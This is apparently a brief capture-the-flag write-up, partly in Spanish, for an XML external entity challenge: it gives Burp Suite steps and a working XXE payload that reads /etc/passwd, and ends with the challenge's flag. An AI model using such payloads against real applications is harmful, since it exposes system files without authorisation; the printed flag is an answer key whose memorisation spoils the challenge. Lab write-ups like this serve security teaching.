
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

Additional details will be available after launching your challenge instance.



XML external entity Injection


**Solución 1**

```

Usar burpsuite, activar intercept on

Al abrir la página debemos de presionar el boton "details" de en medio

Posteriormente mandar la petición a repeater, y pausar el intercept

así debe quedar el xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<data><ID>&test;</ID></data>

dar a boton de send y listo


```


## Respuesta: **picoCTF{XML_3xtern@l_3nt1t1ty_0e13660d}**